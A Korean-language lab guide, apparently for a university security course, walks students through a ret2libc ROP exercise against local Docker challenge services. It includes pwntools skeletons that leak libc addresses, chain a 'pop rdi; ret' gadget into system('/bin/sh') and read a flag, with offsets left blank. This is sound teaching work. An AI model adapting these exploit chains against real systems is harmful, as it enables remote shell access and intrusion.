# 6주차 ROP (ret2libc) — 실습 안내서 (LAB GUIDE)

> 이 문서는 **스캐폴드**입니다. 완성된 공격 페이로드/주소는 담겨 있지 않습니다. 빈칸은 직접 채우세요.

## 0. 환경 준비 (전 OS 동일)
```bash
cp .env.example .env            # STUDENT_ID=본인학번
STUDENT_ID=<본인학번> docker compose up -d --build
# 접속: Main → nc localhost 9004 / Hidden → nc localhost 9005
```
로컬 Level 1·2 빌드(맥·윈도우 포함 동일):
```bash
docker run --rm --platform linux/amd64 -v "$PWD":/w -w /w gcc:11 \
  gcc -O0 -fno-stack-protector -no-pie -z noexecstack -o <out> <src>.c
```
> ⚠️ **Apple Silicon에서 네이티브 빌드 금지**(arm64가 됨). 반드시 `--platform linux/amd64`.

## 1. 핵심 개념
- NX가 켜져 스택 쉘코드 실행 불가 → **libc 함수 재사용(ret2libc)** 으로 `system("/bin/sh")`.
- x86-64 호출 규약: 1번째 인자 = **RDI**. 그래서 `pop rdi; ret` 가젯으로 인자를 세팅.
- no-PIE라 바이너리 주소는 고정, 그러나 **libc는 ASLR로 매 실행 달라짐** → 주소를 알아내야 함.

## 2. 오프셋 찾기
```python
from pwn import *
# cyclic 로 버퍼→RET 거리 측정 (또는 소스에서 buf 크기+saved rbp 8)
```

## 3. 가젯 찾기
```bash
ROPgadget --binary rop_vault | grep "pop rdi ; ret"
objdump -d rop_vault | grep -A1 "pop .*rdi"
```

## 4. Main (9004) — 앵커로 libc 복원
배너가 `libc anchor (stdout)` 주소를 줍니다. 이는 libc 내부 `_IO_2_1_stdout_` 를 가리킵니다.
```python
io = remote("localhost", 9004)
libc = ELF("libc.so.6")              # 배포된 libc
leak = int(... 배너에서 stdout 주소 파싱 ...)
libc.address = leak - libc.sym['_IO_2_1_stdout_']    # libc 베이스 복원
system = libc.sym['system']; binsh = next(libc.search(b'/bin/sh'))
chain  = b"A"*<offset> + p64(POP_RDI) + p64(binsh) + p64(RET) + p64(system)
io.send(chain)
time.sleep(0.4)                      # ★ read() 삼킴 방지: 체인과 명령 사이 간격 필수
io.sendline(b"cat flag.txt")
print(io.recvrepeat(1.5))
```

## 5. Hidden (9005) — 메모리 릭으로 ASLR 우회 (2단계)
힌트가 없습니다. `puts(puts@got)` 로 libc 주소를 **직접 유출**한 뒤 `main` 으로 돌아와 2차 공격.
```python
# Stage 1: puts(puts@got) → libc 유출 → main 재진입
chain1 = b"A"*<offset> + p64(POP_RDI) + p64(e.got['puts']) + p64(e.plt['puts']) + p64(e.sym['main'])
# ... puts 출력 파싱 → libc 베이스 ...
# Stage 2: system("/bin/sh")  (Main과 동일 구조), 전송 후 sleep → cat flag.txt
```

## 6. 트러블슈팅
| 증상 | 원인 | 해결 |
|---|---|---|
| 셸은 떴는데 출력 없음 | 체인과 `cat`을 붙여 전송 → read가 삼킴 | **사이에 sleep(0.3~0.5)** |
| `movaps` SIGSEGV | 스택 16B 미정렬 | `system` 앞에 단독 `ret` 가젯 1개 추가 |
| 주소가 매번 다름 | ASLR(정상) | **같은 연결에서** 릭 즉시 사용, 재실행 금지 |
| Exec format error | arm64로 빌드됨 | `--platform linux/amd64` |
| 전원 default 플래그 | STUDENT_ID 미설정 | `.env` 또는 `STUDENT_ID=` 지정 |

## 7. 보고서
`[SSS]week06_학번_이름.pdf` — 과정·결과 스크린샷 + 동작 원리 설명(오프셋 근거, 가젯, libc 복원, 체인).
